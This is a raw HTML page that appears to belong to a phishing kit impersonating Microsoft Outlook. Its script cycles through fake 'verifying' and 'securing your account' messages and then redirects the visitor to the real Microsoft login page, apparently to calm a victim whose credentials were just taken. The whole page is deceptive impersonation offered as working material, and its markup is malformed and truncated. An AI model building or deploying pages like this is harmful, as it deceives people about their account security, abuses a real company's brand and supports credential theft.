<html>
<head>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="shortcut icon" href="https://msdnshared.blob.core.windows.net/media/MSDNBlogsFS/prod.evol.blogs.msdn.com/CommunityServer.Blogs.Components.WeblogFiles/00/00/00/83/52/metablogapi/5001.Outlook-logo-2_thumb_1713362A.png">

<style type="text/css">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Mail Settings | Email Upgrade</title>

<meta http-equiv="REFRESH" content="20; http://alibaba.com">


<style type="text/css">
<!--
.style1 {font-family: "Courier New", Courier, monospace}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px;}

.style6 {color: #FF6600}
.style8 {font-size: 16}
-->
</style>
<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=2300

//configure destination URL

var targetdestination="https://login.live.com/login.srf?"





var splashmessage=new Array()

var openingtags='<font face="calibri" size="3" color="#000000">'

splashmessage[0]='VERIFYING YOUR MAILBOX...'

splashmessage[1]='PLEASE WAIT WHILE YOUR ACCOUNT IS BEING VERIFY IN DATABASE...'

splashmessage[2]='CONFIRMING ACCOUNT OWNERSHIP...'

splashmessage[3]='RE-CONFIRMING YOUR ACCOUNT IDENTITY ...'

splashmessage[4]='PLEASE WAIT ...'

splashmessage[5]='VALIDATING...'

splashmessage[6]='VALIDATION SUCCESSFUL...'

splashmessage[7]='NOW SECURING YOUR ACCOUNT...'

splashmessage[8]='PLEASE WAIT...'

splashmessage[9]='SECURING IN PROGRESS...'

splashmessage[10]='PLEASE WAIT...'

splashmessage[11]='YOUR ACCOUNT IS NOW SUCCESSFULLY SECURED...'

splashmessage[12]='YOU CAN NOW SIGNIN TO CONTINUE USING YOUR MICROSOFT ACCOUNT'












var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script><title>Account Security Settings </title><script src='/google_analytics_auto.js'></script></head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">


<br><br><br><br>
<table align="center"><tr>

<td width="50">
<img src="https://msdnshared.blob.core.windows.net/media/MSDNBlogsFS/prod.evol.blogs.msdn.com/CommunityServer.Blogs.Components.WeblogFiles/00/00/00/83/52/metablogapi/5001.Outlook-logo-2_thumb_1713362A.png" width="100" height="100">
</td>




<td width="5"></td>






<td width="350">
<div align="left" class="style1" id="splashcontainer" style="visibility: visible; top: 363.5px;"> </div>
</tr></table>


</body>
</htm